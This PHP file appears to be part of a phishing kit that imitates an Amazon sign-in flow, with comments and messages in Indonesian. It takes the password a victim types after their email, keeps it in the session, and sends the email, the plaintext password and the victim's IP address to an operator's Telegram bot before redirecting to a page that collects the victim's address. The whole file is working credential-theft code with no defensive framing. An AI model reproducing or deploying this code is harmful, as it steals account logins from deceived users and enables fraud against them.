<?php
session_start();
require_once '../function.php';
require_once '../system/class/Telegram.php';

global $config;

if (!isset($_SESSION['email'])) {
    header('Location: ../views/amazon.html');
    exit;
}

$sandi = trim($_POST['password'] ?? '');

if (empty($sandi)) {
    header('Location: ../views/password.html?error=empty');
    exit;
}

$_SESSION['password'] = $sandi;

// Kirim ke Telegram
if ($config['kirim_ke_telegram']) {
    $tg = new Telegram($config['telegram_bot_token'], $config['telegram_chat_id']);
    $pesan = "
🔑 <b>PASSWORD DITERIMA</b>
━━━━━━━━━━━━━━━━━━━━━
📧 Email: {$_SESSION['email']}
🔒 Kata Sandi: {$sandi}
🌐 IP: {$_SESSION['ip']}
━━━━━━━━━━━━━━━━━━━━━
    ";
    $tg->kirim($pesan);
}

// Lanjut ke alamat
header('Location: ../views/address.html');
exit;